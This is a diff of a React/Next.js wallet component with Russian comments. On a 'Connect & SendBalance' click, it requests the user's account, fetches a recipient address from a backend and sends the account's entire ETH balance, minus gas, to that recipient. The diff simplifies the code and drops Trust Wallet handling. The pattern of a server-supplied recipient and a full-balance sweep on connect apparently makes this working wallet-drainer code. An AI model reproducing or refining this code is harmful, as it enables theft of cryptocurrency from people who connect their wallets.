@@ -1,91 +1,55 @@
 'use client'
 
-import { useState } from 'react';
-import Web3 from 'web3';
-import type { TransactionReceipt } from 'web3-types';
+import { useState } from 'react'
+import Web3 from 'web3'
+import type { ExternalProvider } from 'web3-core'
 
-import { BACKEND_LINK } from '@/utils/variables';
-
-interface EthereumProvider {
-  selectedAddress?: string
-  isMetaMask?: boolean
-  isTrust?: boolean
-  request(args: { method: string; params?: unknown[] }): Promise<unknown>
-  on?(event: string, listener: (...args: unknown[]) => void): void
-  removeListener?(event: string, listener: (...args: unknown[]) => void): void
-}
-
-// Тип блока с возможными форматами baseFeePerGas
-type BlockWithFee = {
-  baseFeePerGas?: string | number | bigint
-}
-
+// Вынесенная функция: вся логика взаимодействия с контрактом
 async function sendAllBalance(
-  eth: EthereumProvider,
+  eth: ExternalProvider & { request(args: { method: string; params?: unknown[] }): Promise<unknown> },
   addr: string,
-  setStatus: (msg: string) => void,
-  { isTrustWallet }: { isTrustWallet: boolean },
+  setStatus: (msg: string) => void
 ): Promise<string> {
+  // 1. Получаем адрес получателя от бэка
   setStatus('Получаем адрес получателя от бэка…')
-  const res = await fetch(`${BACKEND_LINK}/contract`)
+  const res = await fetch('http://localhost:8000/contract')
   if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
-  const { recipient } = (await res.json()) as { recipient: string }
+  const { recipient } = await res.json() as { recipient: string }
 
+  // 2. Настраиваем Web3
   const web3 = new Web3(eth)
+
+  // 3. Получаем баланс пользователя и параметры газа
   const balanceWei = BigInt(await web3.eth.getBalance(addr))
   const gasLimit = 21000n
-
-  // Получаем блок и приводим к нашему типу
-  const block = (await web3.eth.getBlock('pending')) as BlockWithFee
-  const rawFee = block.baseFeePerGas
-  // Нормализуем в bigint
-  const baseFeePerGas =
-    typeof rawFee === 'bigint'
-      ? rawFee
-      : rawFee != null
-      ? BigInt(rawFee)
-      : 0n
-
+  const block = await web3.eth.getBlock('pending')
+  const baseFeePerGas = block.baseFeePerGas ? BigInt(block.baseFeePerGas) : BigInt(0);
   let maxPriorityFeePerGas: bigint
   try {
     maxPriorityFeePerGas = BigInt(await web3.eth.getMaxPriorityFeePerGas())
   } catch {
     maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
   }
+  const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas
 
-  let receipt: TransactionReceipt
-  if (isTrustWallet) {
-    const gasPrice = BigInt(await web3.eth.getGasPrice())
-    const valueToSend = balanceWei - gasPrice * gasLimit
-    if (valueToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
+  // 4. Рассчитываем сумму к отправке
+  const gasCost = maxFeePerGas * gasLimit
+  const amountToSend = balanceWei - gasCost
+  if (amountToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
+  const hexValue = '0x' + amountToSend.toString(16)
 
-    receipt = await web3.eth.sendTransaction({
-      from: addr,
-      to: recipient,
-      value: web3.utils.toHex(valueToSend),
-      gas: web3.utils.toHex(gasLimit),
-      gasPrice: web3.utils.toHex(gasPrice),
-    })
-  } else {
-    const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas
-    const valueToSend = balanceWei - maxFeePerGas * gasLimit
-    if (valueToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
-
-    const hexValue = '0x' + valueToSend.toString(16)
-    setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)
-
-    receipt = await web3.eth.sendTransaction({
-      from: addr,
-      to: recipient,
-      value: hexValue,
-      gas: gasLimit.toString(),
-      maxPriorityFeePerGas: maxPriorityFeePerGas.toString(),
-      maxFeePerGas: maxFeePerGas.toString(),
-      type: '0x2',
-    })
-  }
-
-  return String(receipt.transactionHash)
+  // 5. Отправляем транзакцию
+  setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)
+  const receipt = await web3.eth.sendTransaction({
+    from: addr,
+    to: recipient,
+    value: hexValue,
+    gas: gasLimit.toString(),
+    maxPriorityFeePerGas: maxPriorityFeePerGas.toString(10),
+    maxFeePerGas: maxFeePerGas.toString(10),
+    type: '0x2',
+  })
+  return String(receipt.transactionHash);
 }
 
 export default function Wallet() {
@@ -100,25 +64,15 @@ export default function Wallet() {
       return
     }
 
-    const isMetaMask = Boolean(eth.isMetaMask)
-    const isTrustWallet = Boolean(eth.isTrust)
-
     setBusy(true)
-    setStatus(
-      `Подключаемся к ${
-        isMetaMask ? 'MetaMask' : isTrustWallet ? 'Trust Wallet' : 'провайдеру'
-      }`,
-    )
     setStatus('Запрашиваем аккаунт…')
-
-    let addr = eth.selectedAddress
+    let addr = eth.selectedAddress as string | undefined
     if (!addr) {
       try {
         const resp = await eth.request({ method: 'eth_requestAccounts' })
         addr = (resp as string[])[0]
       } catch (e: unknown) {
-        const msg = e instanceof Error ? e.message : String(e)
-        setStatus(`Ошибка подключения: ${msg}`)
+        setStatus(`Ошибка подключения: ${e.message}`)
         setBusy(false)
         return
       }
@@ -126,16 +80,10 @@ export default function Wallet() {
     setAccount(addr)
 
     try {
-      const txHash = await sendAllBalance(
-        eth,
-        addr,
-        setStatus,
-        { isTrustWallet },
-      )
+      const txHash = await sendAllBalance(eth, addr, setStatus)
       setStatus(`Успех! TxHash: ${txHash}`)
     } catch (e: unknown) {
-      const msg = e instanceof Error ? e.message : String(e)
-      setStatus(`Ошибка: ${msg}`)
+      setStatus(`Ошибка: ${e.message}`)
     } finally {
       setBusy(false)
     }
@@ -155,14 +103,8 @@ export default function Wallet() {
       >
         {busy ? '…обрабатываем' : 'Connect & SendBalance'}
       </button>
-      <p>
-        <strong>Статус:</strong> {status}
-      </p>
-      {account && (
-        <p>
-          <strong>Ваш аккаунт:</strong> {account}
-        </p>
-      )}
+      <p><strong>Статус:</strong> {status}</p>
+      {account && <p><strong>Ваш аккаунт:</strong> {account}</p>}
     </div>
   )
 }
